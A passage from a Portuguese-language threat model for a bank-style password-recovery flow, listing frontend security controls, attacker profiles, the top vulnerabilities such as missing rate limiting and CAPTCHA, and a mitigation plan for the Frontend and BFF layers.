├─────────────────────────────────────────────────────────────┤
│                                                             │
│  1. Client-Side Validation (React Hook Form)               │
│     └─ Formato de CPF                                      │
│     └─ Campos obrigatórios                                 │
│     └─ Length limits                                       │
│                                                             │
│  2. reCAPTCHA Widget                                       │
│     └─ Renderizar reCAPTCHA v3 invisível                   │
│     └─ Renderizar reCAPTCHA v2 quando solicitado pelo BFF  │
│                                                             │
│  3. CSRF Token Handling                                    │
│     └─ Obter token do BFF em cada sessão                   │
│     └─ Incluir token em todos POST                         │
│                                                             │
│  4. Content Security Policy                                │
│     └─ CSP meta tags                                       │
│     └─ Nonce para scripts inline                           │
│                                                             │
│  5. Sanitização de Output (DOMPurify)                      │
│     └─ Sanitizar antes de renderizar HTML dinâmico         │
│                                                             │
│  6. Rate Limiting Visual                                   │
│     └─ Desabilitar botão "Enviar" por 5s após tentativa    │
│     └─ Exibir contador de tentativas restantes             │
│                                                             │
│  7. Device Fingerprinting (FingerprintJS)                  │
│     └─ Coletar fingerprint do dispositivo                  │
│     └─ Enviar junto com requisições                        │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 7. CONCLUSÃO DA ETAPA 1

### 7.1 Resumo da Análise

Esta modelagem de ameaças identificou **13 vulnerabilidades críticas e altas** no fluxo de recuperação de senha por validação de identidade (PID), focando exclusivamente nas **camadas de Frontend e BFF**.

### 7.2 Perfis de Atacantes Prioritários

1. **Fraudador Bancário Profissional** (Criticidade: ALTA)
   - Maior risco: acesso direto a contas financeiras
   - Motivação: lucro imediato através de transferências fraudulentas

2. **BotHerder / Operador de Botnet** (Criticidade: ALTA)
   - Maior risco: comprometimento em massa
   - Capacidade de bypass de rate limiting por IP

3. **Fraudador Oportunista / Carder** (Criticidade: MÉDIA)
   - Risco: ataques direcionados com engenharia social
   - Foco em alvos de alto valor

### 7.3 Vulnerabilidades Críticas (Top 5)

1. **Ausência de Rate Limiting** - Permite força bruta ilimitada
2. **Ausência de CAPTCHA** - Permite automação completa
3. **Ausência de Bloqueio Temporário** - Persistência do atacante
4. **Input Validation Inadequada** - Abre portas para SQLi/XSS/Path Traversal
5. **Comunicação HTTP** - Expõe credenciais em trânsito

### 7.4 Estratégia de Mitigação

**O BFF atuará como camada de proteção principal**, implementando:
- ✅ Rate limiting multi-camada
- ✅ CAPTCHA dinâmico
- ✅ Validação e sanitização rigorosa de inputs
- ✅ Session management seguro
- ✅ Logging e monitoramento em tempo real
- ✅ Bloqueio temporário progressivo

**O Frontend complementará** com:
- ✅ Validação client-side
- ✅ Integração com reCAPTCHA
- ✅ CSRF token handling
- ✅ Sanitização de output

### 7.5 Próximos Passos

**Etapa 2**: Criação da planilha OWASP Risk Rating com cálculo detalhado de:
- Likelihood (probabilidade de exploração)
- Impact (técnico e de negócio)
- Overall Risk Score
- Priorização quantitativa de mitigações

---

**Data**: 2025-11-14
**Autor**: Security Champions Team - Caju
**Versão**: 2.0 (Revisada - Foco em Frontend/BFF)
**Escopo**: Frontend (React) + BFF (Node.js) - Proteção do Backend (Kotlin)
